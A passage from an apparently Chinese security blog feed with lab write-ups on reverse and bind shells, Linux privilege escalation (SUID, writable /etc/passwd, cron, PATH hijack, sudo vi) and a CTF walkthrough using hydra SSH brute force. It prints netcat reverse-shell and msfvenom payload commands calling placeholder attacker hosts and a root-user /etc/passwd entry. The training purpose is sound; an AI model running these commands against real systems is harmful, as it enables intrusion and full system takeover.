href="https://blog.wohin.me/posts/pawnyable-0201/">Linux Kernel PWN | 040201 Pawnyable之栈溢出 (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/stack_overflow.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v1：堆栈溢出利用 | 可典当！ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pawnyable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell与Linux常见权限提升技术</title>
      <link href="/2024/01/15/Shell%E4%B8%8ELinux%E5%B8%B8%E8%A7%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF/"/>
      <url>/2024/01/15/Shell%E4%B8%8ELinux%E5%B8%B8%E8%A7%81%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p><img src="/PenTest_FILE/f359dc9b359137fc0a67464fef1365fd_MD5.jpeg"></p><h1 id="一、shell是什么"><a href="#一、shell是什么" class="headerlink" title="一、shell是什么"></a>一、shell是什么</h1><h2 id="Shell的类型"><a href="#Shell的类型" class="headerlink" title="Shell的类型"></a>Shell的类型</h2><blockquote><p>在高层次上，当涉及到利用目标时，我们对两种 shell 感兴趣：反向 shell 和绑定 shell。</p></blockquote><ul><li>Reverse shells<br>反向 shell 是指强制目标执行连接回计算机的代码，在攻击机上设置接受连接的侦听器。<br>反向 shell 是绕过防火墙规则的好方法，因为这些规则可能会阻止您连接到目标上的任意端口。但缺点是，当通过 Internet 从计算机接收 shell 时，您需要配置自己的网络以接受 shell。</li></ul><p>以下是一个linux的反向shell例子：</p><p>攻击机<code>sudo nc -lvnp 443</code>监听端口，靶机<code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code>连接我们的ip和监听端口<br><img src="/PenTest_FILE/8986b480d2916588fe9ae5361abb94bc_MD5.jpeg"></p><ul><li>Bind shells<br>绑定 shell 是指使用在目标上执行的代码来启动直接在目标上附加到 shell 的侦听器。<br>这将向互联网开放，这意味着您可以连接到代码已打开的端口，并以这种方式获得远程代码执行。这样做的优点是不需要在您自己的网络上进行任何配置，但缺点是可以通过保护目标的防火墙来阻止。</li></ul><p>以下是一个windows的绑定shell例子：<br>靶机<code>nc -lvnp &lt;port&gt; -e &quot;cmd.exe&quot;</code>在本地开放端口，攻击机<code>nc MACHINE_IP &lt;port&gt;</code>去连接靶机的该端口<br><img src="/PenTest_FILE/d0ca8083ce4908d80fad645da9518acb_MD5.jpeg"></p><hr><p>还有一个概念是交互性，Shell 可以是交互式的，也可以是非交互式的。</p><h2 id="一-Netcat-shell"><a href="#一-Netcat-shell" class="headerlink" title="(一) Netcat shell"></a>(一) Netcat shell</h2><h3 id="Netcat-shell"><a href="#Netcat-shell" class="headerlink" title="Netcat shell"></a>Netcat shell</h3><ul><li>Reverse shell<br>使用 Linux 启动 netcat 侦听器的语法如下：<br><code>nc -lvnp &lt;port-number&gt;</code></li></ul><blockquote><p>-l：用于告诉 netcat 这将是一个侦听器<br>-v：详细信息<br>-n：告诉 netcat 不要解析主机名或使用 DNS<br>-p：表示将遵循端口规范</p></blockquote><p>上一个任务中的示例使用了端口 443。实际上，您可以使用任何您喜欢的端口，只要还没有服务使用它。请注意，如果选择使用低于 1024 的端口，则需要在启动侦听器时使用 <code>sudo</code> 。也就是说，使用已知的端口号（80、443 或 53 是不错的选择）通常是一个好主意，因为这更有可能绕过目标上的出站防火墙规则。</p><ul><li>Bind shell<br>如果我们希望在目标上获得绑定 shell，那么我们可以假设在目标的选定端口上已经有一个侦听器在等着我们：我们需要做的就是连接到它。其语法相对简单：<br><code>nc &lt;target-ip&gt; &lt;chosen-port&gt;</code></li></ul><h3 id="稳定shell"><a href="#稳定shell" class="headerlink" title="稳定shell"></a>稳定shell</h3><blockquote><p>默认情况下，这些 shell 非常不稳定。按 Ctrl + C 会杀死整个事情。它们是非交互式的，并且经常有奇怪的格式错误。这是因为 netcat 的“shell”实际上是在终端内运行的进程，而不是真正的终端。幸运的是，有很多方法可以稳定 Linux 系统上的 netcat shell。</p></blockquote><h4 id="Ⅰ-python"><a href="#Ⅰ-python" class="headerlink" title="Ⅰ. python"></a>Ⅰ. python</h4><p>这种技术仅仅适用于linux机器，因为它们总是默认安装了python</p><ol><li><p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>它使用 Python 生成外观更好的 bash shell。请注意，某些目标可能需要指定的 Python 版本。如果是这种情况，请根据需要替换为 <code>python</code> <code>python2</code> 或 <code>python3</code> 。</p></li><li><p><code>export TERM=xterm</code><br>这将使我们能够访问术语命令，例如 <code>clear</code> .</p></li><li><p><code>stty raw -echo; fg</code><br>最后（也是最重要的）我们将使用 Ctrl + Z 对 shell 进行后台处理。回到我们自己的终端中，我们执行<code>stty raw -echo; fg</code> 。这做了两件事：它关闭了我们自己的终端回显（它使我们能够访问 Tab 自动完成、箭头键和 Ctrl + C 来终止进程），并将拿到的shell放在我们自己的终端。</p></li></ol><blockquote><p>请注意，如果 shell 死亡，您自己的终端中的任何输入都将不可见（由于禁用了终端回显）。解决方法是键入 <code>reset</code> 并按 Enter。</p></blockquote><h4 id="Ⅱ-rlwarp"><a href="#Ⅱ-rlwarp" class="headerlink" title="Ⅱ. rlwarp"></a>Ⅱ. rlwarp</h4><blockquote><p>RLWrap 是一个程序，简单来说，它使我们能够在收到 shell 后立即访问历史记录、Tab 自动完成和箭头键。默认情况下，Kali 上未安装 rlwrap，因此首先使用 <code>sudo apt install rlwrap</code></p></blockquote><p><code>rlwrap nc -lvnp &lt;port&gt;</code></p><blockquote><p>在 netcat 监听器前面加上 “rlwrap” 为我们提供了一个功能更全面的 shell。这种技术在处理 Windows shell 时特别有用。<br>而在处理 Linux 目标时，可以使用与上一种技术的第三步相同的技巧来完全稳定：使用 Ctrl + Z 使 shell 背景，然后用于 <code>stty raw -echo; fg</code> 稳定并重新进入 shell。</p></blockquote><h4 id="Ⅲ-socat"><a href="#Ⅲ-socat" class="headerlink" title="Ⅲ. socat"></a>Ⅲ. socat</h4><blockquote><p>稳定 shell 的第三种简单方法是使用初始 netcat shell 作为进入功能更全面的 socat shell 的垫脚石。请记住，此技术仅限于 Linux 目标，<strong>因为 Windows 上的 Socat shell 不会比 netcat shell 更稳定</strong></p></blockquote><h2 id="二-Socket-shell"><a href="#二-Socket-shell" class="headerlink" title="(二) Socket shell"></a>(二) Socket shell</h2><h3 id="Socket-shell"><a href="#Socket-shell" class="headerlink" title="Socket shell"></a>Socket shell</h3><h3 id="加密shell"><a href="#加密shell" class="headerlink" title="加密shell"></a>加密shell</h3><h2 id="三-Msfvenom"><a href="#三-Msfvenom" class="headerlink" title="(三) Msfvenom"></a>(三) Msfvenom</h2><blockquote><p>Msfvenom，是与所有payload相关的一站式商店。作为 Metasploit 框架的一部分，msfvenom 主要用于生成反向和绑定 shell 的代码。它广泛用于较低级别的漏洞利用开发中，以在开发类似缓冲区溢出漏洞时生成十六进制 shellcode；但是，它也可用于生成各种格式（例如 <code>.exe</code> ， <code>.aspx</code>， <code>.war</code>， <code>.py</code> ）的有效载荷</p></blockquote><h2 id="四-Webshells"><a href="#四-Webshells" class="headerlink" title="(四)Webshells"></a>(四)Webshells</h2><h2 id="Linux练习箱"><a href="#Linux练习箱" class="headerlink" title="Linux练习箱"></a>Linux练习箱</h2><h2 id="Windows练习箱"><a href="#Windows练习箱" class="headerlink" title="Windows练习箱"></a>Windows练习箱</h2><h1 id="二、常见Linux权限提升技术"><a href="#二、常见Linux权限提升技术" class="headerlink" title="二、常见Linux权限提升技术"></a>二、常见Linux权限提升技术</h1><p><img src="/PenTest_FILE/0a70592ff63c044809ad9164425e3aed_MD5.jpeg"></p><ul><li>水平权限提升：这是通过接管与您处于相同权限级别的其他用户来扩大对受感染系统的影响范围的地方。例如，一个普通用户劫持另一个普通用户（而不是提升为超级用户）。这允许您继承该用户拥有的任何文件和访问权限。例如，这可用于访问另一个普通特权用户，该用户恰好将 SUID 文件附加到其主目录（稍后会详细介绍），然后可以使用该文件来获取超级用户访问权限。</li><li>垂直权限提升：这是您尝试使用已泄露的现有帐户获得更高权限或访问权限的地方。对于本地权限升级攻击，这可能意味着劫持具有管理员权限或 root 权限的帐户。</li></ul><h2 id="一-枚举"><a href="#一-枚举" class="headerlink" title="(一) 枚举"></a>(一) 枚举</h2><blockquote><p>我们需要用到一个bash脚本：<code>LinEnum</code>，<a href="%5Bhttps://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%5D(https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)">地址</a>。LinEnum 是一个简单的 bash 脚本，它执行与权限提升相关的常见命令。</p></blockquote><h3 id="如何在目标计算机获得LinEnum"><a href="#如何在目标计算机获得LinEnum" class="headerlink" title="如何在目标计算机获得LinEnum"></a>如何在目标计算机获得LinEnum</h3><ol><li><p>第一种方法：是在本机转到存储 LinEnum 本地副本的目录，并使用<code>python3 -m http.server 8000</code> [1] 启动 Python Web 服务器。然后，在目标机器上使用<code>wget</code>连接本地 IP:8000，您可以从本地机器 [2] 获取文件。然后使用命令<code>chmod +x FILENAME.sh</code>使文件可执行。</p></li><li><p>第二种方法：如果您无法传输文件，您还可以从本地计算机 [1] 直接复制原始 LinEnum 代码，并使用 Vi 或 Nano [2] 将其粘贴到目标上的新文件中。</p></li></ol><h3 id="LinEnum的使用"><a href="#LinEnum的使用" class="headerlink" title="LinEnum的使用"></a>LinEnum的使用</h3><p>我们关注输出的这几项内容：</p><ul><li><em>Kernel</em>：此处显示内核信息。这台机器很可能存在可用的内核漏洞。</li><li><em>Can we read&#x2F;write sensitive files</em>：这些是任何经过身份验证的用户都可以读取和写入的文件。通过查看这些敏感文件的权限，我们可以看到哪里存在配置错误，允许通常不应该写入敏感文件的用户。</li><li><em>SUID Files</em>：此处显示了 SUID 文件的输出。有一些有趣的项目，我们肯定会将其作为提升特权的一种方式。SUID（在执行时设置所有者用户 ID）是授予文件的一种特殊类型的文件权限。它允许文件以所有者的权限运行。如果这是 root，则它以 root 权限运行。它可以让我们提升权限。</li><li><em>Crontab Contents</em>：crontab是一个系统中定期执行任务的工具</li></ul><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><p>先用ssh连接主机，以user3的身份登录</p><p>使用python web服务器，传输LinEnum.sh<br><img src="/PenTest_FILE/d48205e48d07ead847c2b110654b759b_MD5.jpeg"></p><ol><li>目标的主机名是什么？答：polobox<br>直接hostname命令即可</li><li>查看 &#x2F;etc&#x2F;passwd 的输出，系统上有多少个“user[x]”？答：8<br><img src="/PenTest_FILE/e8048726010b63d973dd291a0190e26c_MD5.jpeg"></li><li>系统上有多少个可用的shell？答：4<br>查看&#x2F;etc&#x2F;shells<br><img src="/PenTest_FILE/654a118fe4a67e3e7c36a4868e41694f_MD5.jpeg"></li><li>cron 设置为每 5 分钟运行一次的 bash 脚本的名称是什么？答：autoscript.sh<br>查看&#x2F;etc&#x2F;crontab<br><img src="/PenTest_FILE/ae55b638765cf9226940c7aaf1d1156f_MD5.jpeg"></li><li>哪个关键文件的权限已更改以允许某些用户写入它？答：&#x2F;etc&#x2F;passwd<br><img src="/PenTest_FILE/f8cd54fbb40f976465fffea80fd1616e_MD5.jpeg"></li></ol><p>s## (二) 利用suid&#x2F;guid文件</p><h3 id="什么是suid二进制文件"><a href="#什么是suid二进制文件" class="headerlink" title="什么是suid二进制文件"></a>什么是suid二进制文件</h3><p>众所周知，在 Linux 中，一切都是一个文件，包括有权允许或限制三个操作的目录和设备，即读&#x2F;写&#x2F;执行。因此，当您为任何文件设置权限时，您应该了解您允许或限制所有三个权限的 Linux 用户。请看以下最大权限 （rwx-rwx-rwx） 的演示：</p><p>r &#x3D; read r &#x3D; 读取<br>w &#x3D; write w &#x3D; 写入<br>x &#x3D; execute x &#x3D; 执行  </p><table><thead><tr><th>user</th><th>group</th><th>others</th></tr></thead><tbody><tr><td>rwx</td><td>rwx</td><td>rwx</td></tr><tr><td>421</td><td>421</td><td>421</td></tr></tbody></table><p>但是，当向每个用户授予特殊权限时，它就变成了 SUID或 SGID。</p><ul><li>SUID(rws-rwx-rwx)： 0表示去除suid权限，4表示添加suid权限，而且是在原权限的数字表达形式开头加0或4，如：0755移除suid权限，4755添加suid权限。</li><li>GUID(rwx-rws-rwx)：0表示去除sgid权限，2表示添加sgid权限，而且是在原权限的数字表达形式开头加0或2，如：0755移除sgid权限，2755添加sgid权限。</li></ul><h3 id="寻找suid文件"><a href="#寻找suid文件" class="headerlink" title="寻找suid文件"></a>寻找suid文件</h3><p>LinEnum能够自动扫描SUID文件，不过如果要手动操作，我们可以使用命令：<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><ul><li>find - 启动“find”命令</li><li>&#x2F; - 搜索整个文件系统</li><li>-perm - 搜索具有特定权限的文件</li><li>-u&#x3D;s - 为文件设置了任何权限位模式。这种形式接受符号模式</li><li>-type f - 仅搜索文件</li><li>2&gt;&#x2F;dev&#x2F;null - 禁止显示错误</li></ul><h3 id="利用suid文件"><a href="#利用suid文件" class="headerlink" title="利用suid文件"></a>利用suid文件</h3><blockquote><p>参考文章：<a href="https://gtfobins.github.io/">GTFOBins — 走开垃圾箱</a></p></blockquote><h2 id="三-利用可写的-etc-passwd"><a href="#三-利用可写的-etc-passwd" class="headerlink" title="(三) 利用可写的 &#x2F;etc&#x2F;passwd"></a>(三) 利用可写的 &#x2F;etc&#x2F;passwd</h2><h3 id="何为-etc-passwd"><a href="#何为-etc-passwd" class="headerlink" title="何为&#x2F;etc&#x2F;passwd"></a>何为&#x2F;etc&#x2F;passwd</h3><blockquote><p>&#x2F;etc&#x2F;passwd 文件存储登录时所需的基本信息。换句话说，它存储用户帐户信息。&#x2F;etc&#x2F;passwd 是一个纯文本文件。它包含系统帐户列表，为每个帐户提供一些有用的信息，如用户 ID、组 ID、主目录、shell 等。</p></blockquote><p>&#x2F;etc&#x2F;passwd 文件应具有常规读取权限，因为许多命令实用程序使用它来将用户标识映射到用户名。但是，对 &#x2F;etc&#x2F;passwd 的写入访问权限<strong>必须仅限制超级用户&#x2F;root 帐户</strong>。如果没有，或者用户被错误地添加到允许写入的组中，那么我们就可能允许创建一个我们可以访问的root用户。</p><h3 id="etc-passwd的格式"><a href="#etc-passwd的格式" class="headerlink" title="&#x2F;etc&#x2F;passwd的格式"></a>&#x2F;etc&#x2F;passwd的格式</h3><p>&#x2F;etc&#x2F;passwd 文件每行包含一个条目，用于系统的每个用户（用户帐户）。所有字段都用冒号“:”分隔。总共有七个字段，如下所示。通常，&#x2F;etc&#x2F;passwd 文件条目如下所示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">test:x:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>Username：用户名，用户登录时使用</li><li>Password：密码，x 字符表示加密的密码存储在 &#x2F;etc&#x2F;shadow 文件中。请注意，您需要使用 passwd 命令来计算在 CLI 中键入的密码的哈希值，或者在 &#x2F;etc&#x2F;shadow 文件中存储&#x2F;更新密码的哈希值，在这种情况下，密码哈希值存储为“x”。</li><li>User ID(UID)：用户ID，必须为每个用户分配一个用户 ID （UID）。UID 0（零）保留给 root，UID 1-99 保留给其他预定义帐户。此外，UID 100-999 由系统为管理和系统帐户&#x2F;组保留。</li><li>Group ID(GID)：组ID，存储在 &#x2F;etc&#x2F;group 文件中</li><li>User ID info：用户ID信息，它允许您添加有关用户的额外信息，例如用户的全名、电话号码等。</li><li>Home directory：主目录，用户登录时所在目录的绝对路径。如果此目录不存在，则 users 目录变为 &#x2F;</li><li>Command&#x2F;shell：命令或 shell 的绝对路径 （&#x2F;bin&#x2F;bash）。通常，这是一个 shell</li></ol><h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><p>继续枚举用户，我们发现 user7 是 gid 为 0 的根组的成员。我们已经从 LinEnum 扫描中知道 &#x2F;etc&#x2F;passwd 文件对用户来说是可写的。因此，根据这一观察，我们得出结论，user7 可以编辑 &#x2F;etc&#x2F;passwd 文件。(现在假设我们已知user7用户的密码为password)<br><img src="/PenTest_FILE/29954f8582e4ee14fcca9fb04b4a25c5_MD5.jpeg"></p><p>其实很简单，如果我们有一个可写的 &#x2F;etc&#x2F;passwd 文件，我们可以根据上面的公式写一个新行条目，创建一个新用户！我们添加我们选择的密码哈希，并将 UID、GID 和 shell 设置为 root。允许我们以自己的root用户身份登录！</p><p><code>openssl passwd -1 -salt [salt] [password]</code>，该命令可以得到用户hash</p><p>比如我们先创建一个用户new，密码为123：<br><img src="/PenTest_FILE/67960ae526f35153c6894833c9d679e9_MD5.jpeg"><br>那么可以推测该用户的&#x2F;etc&#x2F;passwd条目是：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">new:<span class="token variable">$1</span><span class="token variable">$new</span><span class="token variable">$p7ptkEKU1HnaHpRtzNizS1</span>:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来su切换为user7，将它添加至&#x2F;etc&#x2F;passwd的末尾即可<br><img src="/PenTest_FILE/57ed34af3a2da6053065f8e8ce8f17b4_MD5.jpeg"></p><h2 id="四-利用vi编辑器"><a href="#四-利用vi编辑器" class="headerlink" title="(四) 利用vi编辑器"></a>(四) 利用vi编辑器</h2><h3 id="sudo-l命令"><a href="#sudo-l命令" class="headerlink" title="sudo -l命令"></a>sudo -l命令</h3><p>每次访问某个帐户时，都应使用<code>sudo -l</code>来列出作为该帐户可以使用的root用户命令。您会发现您可以在没有 root 密码的情况下以 root 用户身份运行某些命令。这可以帮助提升权限。</p><h3 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h3><blockquote><p>背景：登录用户user8:password</p></blockquote><p>先看看有哪些root命令可供使用<br><img src="/PenTest_FILE/ea7dc6d0d4f798aeeb53fc1a93d1f1d4_MD5.jpeg"><br>直接<code>sudo vi</code>，输入<code>: !sh</code><br><img src="/PenTest_FILE/006ffe6378b58ad085da0f91d55eaa79_MD5.jpeg"><br><img src="/PenTest_FILE/619894bdd61c728a3c621cc1a8fe2905_MD5.jpeg"></p><h2 id="五-利用crontab"><a href="#五-利用crontab" class="headerlink" title="(五) 利用crontab"></a>(五) 利用crontab</h2><h3 id="何为Cron进程"><a href="#何为Cron进程" class="headerlink" title="何为Cron进程"></a>何为Cron进程</h3><p>Cron 守护进程是一个长时间运行的进程，它在特定日期和时间执行命令。您可以使用它来计划活动，既可以作为一次性事件，也可以作为重复性任务。您可以创建一个 crontab 文件，其中包含供 Cron 守护程序执行的命令和指令。</p><p>我们可以使用命令 <code>“cat /etc/crontab”</code> 来查看调度了哪些 cron 作业。每当有机会时，您都应该始终手动检查这一点，尤其是在 LinEnum 或类似脚本找不到任何内容的情况下。</p><h3 id="Cronjob的格式"><a href="#Cronjob的格式" class="headerlink" title="Cronjob的格式"></a>Cronjob的格式</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Example of job definition:                                                                 │</span><span class="token comment"># .---------------- minute (0 - 59)                                                          │</span><span class="token comment"># |  .------------- hour (0 - 23)                                                            │</span><span class="token comment"># |  |  .---------- day of month (1 - 31)                                                    │</span><span class="token comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...                                    │</span><span class="token comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat       │</span><span class="token comment"># |  |  |  |  |                                                                              │</span><span class="token comment"># *  *  *  *  * user-name command to be executed    </span><span class="token number">17</span> *    * * *   root    <span class="token builtin class-name">cd</span> / <span class="token operator">&amp;&amp;</span> run-parts <span class="token parameter variable">--report</span> /etc/cron.hourly  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="练习-3"><a href="#练习-3" class="headerlink" title="练习"></a>练习</h3><p>我们从 LinEnum 扫描中得知，user4 桌面上的文件 autoscript.sh 计划每五分钟运行一次。它归 root 所有，这意味着它将以 root 权限运行，尽管我们可以写入此文件。然后，任务是创建一个命令，该命令将返回一个 shell 并将其粘贴到此文件中。当文件在五分钟后再次运行时，shell 将以 root 身份运行。</p><p><img src="/PenTest_FILE/9ee0f823d61b02fba0bf64c69e4bcff7_MD5.jpeg"><br><img src="/PenTest_FILE/9751d7e7e26ed9e384794a4271832589_MD5.jpeg"></p><p>我们使用 msfvenom 为我们的 cron 漏洞创建一个反弹shell的payload，命令 <code>msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</code><br><img src="/PenTest_FILE/ca4bea5480bb2b56990b43e04b11655e_MD5.jpeg"></p><p>将payload写入 autoscript.sh文件，接着在本地进行监听，约5分钟后成功反弹shell！<br><img src="/PenTest_FILE/ceda654dc6d8b3f9d2bcc5ab9e639554_MD5.jpeg"></p><h2 id="六-利用PATH变量"><a href="#六-利用PATH变量" class="headerlink" title="(六) 利用PATH变量"></a>(六) 利用PATH变量</h2><h3 id="什么是-PATH"><a href="#什么是-PATH" class="headerlink" title="什么是$PATH"></a>什么是$PATH</h3><p>PATH 是 Linux 和类 Unix 操作系统中的环境变量，它指定保存可执行程序的目录。<strong>当用户在终端中运行任何命令时，它会借助 PATH 变量搜索可执行文件，以响应用户执行的命令。</strong></p><p>借助命令<code>“echo $PATH”</code>查看相关用户的路径非常简单。<br><img src="/PenTest_FILE/cabb436cde1b15b6f8fcfae5a9e8a8de_MD5.jpeg"></p><h3 id="如何利用-PATH"><a href="#如何利用-PATH" class="headerlink" title="如何利用$PATH"></a>如何利用$PATH</h3><p>假设我们有一个 SUID 二进制文件。运行它，我们可以看到它正在调用系统 shell 来执行一个基本功能，例如使用“ps”列出进程。与我们之前的 SUID 示例不同，在这种情况下，我们无法通过提供注入参数来利用它，那么我们可以做些什么来尝试利用它呢？</p><p>我们可以将 PATH 变量重写到我们选择的位置！当 SUID 二进制文件调用系统 shell 来运行可执行文件时，它会运行我们编写的可执行文件。</p><h3 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h3><p>目录下有个名为“script”的文件，运行下看看：<br><img src="/PenTest_FILE/6a7a003dbc3339fa894ee9f1efc326c2_MD5.jpeg"><br>具有suid权限，实现了目录 ls 功能</p><p>我们先将目录改为&#x2F;tmp，创建一个伪造可执行文件，格式是<code>echo “[无论我们想运行什么命令]” &gt; [我们正在模仿的可执行文件的名称]</code><br><img src="/PenTest_FILE/da75c583e5ecf424d5f04c1addf2cc1f_MD5.jpeg"></p><p>接着更改路径变量，使其指向存储着伪造“ls”的目录，命令是<code>export PATH=/tmp:$PATH</code>，在$PATH前面加上&#x2F;tmp目录。<br>请注意，这将导致您每次使用“ls”时都打开 bash 提示符。如果你在完成漏洞利用之前需要使用“ls”，请使用<code>“/bin/ls”</code>，是真正的“ls”可执行文件所在。<br><img src="/PenTest_FILE/b9eb04149b140969d0cced3a60645eb7_MD5.jpeg"></p><p>成功得到root权限！<br><img src="/PenTest_FILE/cfb51fd1b4cad70c9d34ab1ee7657159_MD5.jpeg"></p><blockquote><p>一旦你完成了这个漏洞利用，你可以退出root，并使用<code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH</code>，将PATH变量重置为默认值，让你能够正常使用“ls”</p></blockquote><h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>在 Linux 权限提升这个巨大的领域中，从来没有一个“神奇”的答案。这只是尝试提升权限时需要注意的基本事项的几个示例，要想做得更好，唯一的方法就是练习和积累经验。清单是确保您在枚举阶段没有遗漏任何内容的好方法，并且还可以为您提供一个资源，以便在您忘记确切使用哪些命令时检查如何执行操作。</p><p>以下是适用于 CTF 或渗透测试用例的良好清单列表。虽然我鼓励你使用CherryTree或任何你喜欢的笔记应用程序来制作自己的笔记。</p><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></li><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</a></li><li><a href="https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</a></li></ul><p><strong>Thank you</strong><br>感谢您抽出宝贵时间在这个房间里工作，祝您未来好运。</p><h1 id="三、Linux提权练习"><a href="#三、Linux提权练习" class="headerlink" title="三、Linux提权练习"></a>三、Linux提权练习</h1>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Basic Pentesting</title>
      <link href="/2023/12/31/Basic%20Pentesting/"/>
      <url>/2023/12/31/Basic%20Pentesting/</url>
      
        <content type="html"><![CDATA[<p><img src="/PenTest_FILE/e4c78613f5bda4aacb84f58c0ca7d9b7_MD5.jpeg"></p><h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p>nmap探测服务，是Linux ubuntu服务器，80端口运行web服务。同时注意到在139&#x2F;445端口运行了SMB服务，在22开启了ssh服务<br><img src="/PenTest_FILE/562ee197b364bdc5b4c915d7006cea40_MD5.jpeg"><br>爆一下目录看看<br><img src="/PenTest_FILE/109ec34b3aedc9e6712fccd291e55669_MD5.jpeg"></p><p>发现可疑目录<br><img src="/PenTest_FILE/5319d1fc8849682c0f9d452333d4738e_MD5.jpeg"><br>看一下其中的内容：</p><pre class="line-numbers language-text" data-language="text"><div class="caption"><span>TI:"dev.txt"</span></div><code class="language-text">2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neatto host that on this server too. Haven't made any real web apps yet, but I have tried that exampleyou get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K2018-04-22: SMB has been configured. -K2018-04-21: I got Apache set up. Will put in our content later. -J2018年4月23日：我一直在搞那个struts的东西，它非常酷！我认为在这个服务器上托管它可能会很有趣。我还没有制作过真正的Web应用程序，但我已经尝试过你可以展示它如何工作的示例（它是示例的REST版本！）。哦，现在我正在使用2.5.12版本，因为其他版本给我带来了麻烦。-K2018年4月22日：SMB已配置。-K2018年4月21日：我已经设置好了Apache。稍后将放入我们的内容。-J<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><div class="caption"><span>TI:"j.txt"</span></div><code class="language-text">For J:I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,and I was able to crack your hash really easily. You know our password policy, so please followit? Change that password ASAP.-K对J：我一直在审计/etc/shadow的内容，以确保我们没有任何弱凭据，我很容易破解了你的哈希。你知道我们的密码策略，请遵循它？尽快更改密码。-K<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从信息中可见配置了SMB服务，并且存在弱口令问题</p><h1 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h1><p>先上enum4linux探测，发现了以下有效的信息<br><img src="/PenTest_FILE/bb6311104710e651a14f1462d90d0ea5_MD5.jpeg"><br>尝试匿名登录，成功<br><img src="/PenTest_FILE/40c34794810a0b17084e5fa077ab6b9e_MD5.jpeg"><br>看一下staff.txt</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Announcement to staff:PLEASE do not upload non-work-related items to this share. I know it's all in fun, butthis is how mistakes happen. (This means you too, Jan!)-Kay请不要上传与工作无关的内容到此共享文件夹。我知道这很有趣，但这就是错误发生的原因。 （这也适用于你，Jan！）-Kay<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们得知了该用户是Jan</p><p>从前面得知，J的密码存在弱口令问题，我们可能通过爆破ssh密码来登录服务器<br><code>hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.76.117</code><br>爆了6分钟，成功爆破出密码：jan : armando<br><img src="/PenTest_FILE/e0b64b9ecf5ee5c83c2ad4c663941680_MD5.jpeg"></p><p>接着ssh登录Jan的账户，可见还有另一个用户是kay，其下有一个可疑备份文件，需要root打开<br><img src="/PenTest_FILE/bb2f4148513a8e7e72edf1802fe1a834_MD5.jpeg"><br><img src="/PenTest_FILE/93c432317983aa24dc443ae16649aeee_MD5.jpeg"></p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><p>使用python作为一个简单的服务器上传LinEnum.sh，以寻找我们可用的信息</p><p>注意：我们事先转入&#x2F;tmp，因为任何用户都可以写入此文件夹<br><img src="/PenTest_FILE/6e4faf841b6bb63d9f625963320c862b_MD5.jpeg"><br>chmod +x后运行</p><p>搜集到一些有用的信息：</p><ul><li>kay是管理员<br><img 